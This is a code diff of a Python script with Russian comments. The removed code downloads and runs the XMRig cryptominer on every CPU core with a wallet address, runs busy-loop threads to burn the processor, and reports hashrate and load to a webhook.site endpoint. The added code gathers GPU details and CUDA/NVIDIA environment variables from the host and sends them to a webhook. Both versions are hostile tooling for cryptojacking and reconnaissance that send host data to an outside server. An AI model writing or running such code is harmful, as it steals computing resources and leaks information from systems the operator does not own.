@@ -2,72 +2,50 @@ import os
 import subprocess
 import json
 import http.client
-import time
-import threading
-import multiprocessing
 
-# КОНФИГ
 HOOK_DOMAIN = "webhook.site"
-HOOK_PATH = "/d9ed8938-0733-4ce3-8d2c-63dab5606e87"
-CORES = multiprocessing.cpu_count()
+HOOK_PATH = "/a2e14ec9-7ce8-425c-aa61-23f2d0e26591"
 
-def send_payload(data):
+def send_gpu_report(status, details):
     try:
         conn = http.client.HTTPSConnection(HOOK_DOMAIN, timeout=5)
-        conn.request("POST", HOOK_PATH, json.dumps(data), {"Content-Type": "application/json"})
+        payload = json.dumps({"EVENT": "GPU_CHECK", "STATUS": status, "DETAILS": details})
+        conn.request("POST", HOOK_PATH, payload, {"Content-Type": "application/json"})
         conn.getresponse()
         conn.close()
     except: pass
 
-def alu_burner():
-    """Максимальная нагрузка на арифметику (ALU), не трогая RAM"""
-    x = 1.1
-    while True:
-        x = (x * 1.1) / 1.0000001 # Бесконечный цикл Float-вычислений
+def check_gpu():
+    results = {}
+    
+    # 1. Проверка через lspci (нужен pciutils)
+    pci = os.popen("lspci | grep -i 'vga\|3d\|nvidia\|amd'").read()
+    results["lspci"] = pci if pci else "None"
 
-def start_mining_poc():
-    # 1. Тянем бинарник
-    if not os.path.exists("./xmrig"):
-        os.system("wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz -O xm.tar.gz && tar -xf xm.tar.gz && mv xmrig-6.21.0/xmrig ./xmrig")
+    # 2. Проверка устройств в /dev
+    dev_nvidia = os.path.exists("/dev/nvidia0")
+    dev_dri = os.listdir("/dev/dri") if os.path.exists("/dev/dri") else []
+    results["dev_nodes"] = {"nvidia": dev_nvidia, "dri": dev_dri}
 
-    # 2. Запуск с агрессивными флагами для "Light" режима (раз HugePages нет)
-    cmd = [
-        "./xmrig", "-o", "donate.v2.xmrig.com:3333", 
-        "-u", "44AFFq5kSiGBo3SBYnrYcyEC2UWXSp2B8F6K8sZ9z41YhUrX7ivU", 
-        "--threads", str(CORES), "--cpu-no-yield", "--randomx-mode", "light", "--no-color"
-    ]
-    return subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+    # 3. Попытка вызвать nvidia-smi
+    try:
+        smi = subprocess.check_output(["nvidia-smi", "-L"], stderr=subprocess.STDOUT, text=True)
+        results["nvidia_smi"] = smi.strip()
+    except:
+        results["nvidia_smi"] = "Not Found"
+
+    # 4. Переменные окружения (часто для CUDA в контейнерах)
+    results["env"] = {k: v for k, v in os.environ.items() if "CUDA" in k or "NVIDIA" in k}
+
+    return results
 
 if __name__ == "__main__":
-    send_payload({"EVENT": "FULL_POC_START", "TARGET_CORES": CORES})
-
-    # Шаг 1: Запускаем фоновый прожиг ядер (чтобы Load сразу ушел в CORES)
-    for _ in range(CORES):
-        threading.Thread(target=alu_burner, daemon=True).start()
-
-    # Шаг 2: Запускаем майнер для фиксации хешрейта
-    proc = start_mining_poc()
-
-    # Шаг 3: Цикл мониторинга
-    print(f"[*] PoC Active. Monitoring {CORES} cores...")
-    while True:
-        line = proc.stdout.readline()
-        if "speed" in line:
-            # Извлекаем хешрейт из вывода XMRig
-            try:
-                hashrate = line.split()[3] # Обычно 4-й элемент в строке speed
-                load = os.getloadavg()
-                
-                # Финальный отчет на хук
-                send_payload({
-                    "EVENT": "FULL_EXHAUSTION_DATA",
-                    "HASHRATE": f"{hashrate} H/s",
-                    "LOAD_AVG": load,
-                    "MEM_FREE": os.popen("free -m").read().splitlines()[1].split()[3] + "MB"
-                })
-            except: pass
-        
-        if not line and proc.poll() is not None:
-            send_payload({"EVENT": "PROCESS_KILLED_BY_SYSTEM"})
-            break
-        time.sleep(1)
+    print("[*] Scanning for GPU hardware...")
+    gpu_data = check_gpu()
+    
+    if gpu_data["nvidia_smi"] != "Not Found" or gpu_data["dev_nodes"]["nvidia"]:
+        send_gpu_report("GPU_DETECTED", gpu_data)
+        print("[!!!] GPU FOUND! Switching to CUDA stress test...")
+    else:
+        send_gpu_report("NO_GPU_FOUND", gpu_data)
+        print("[-] No GPU detected. Staying on CPU stress.")
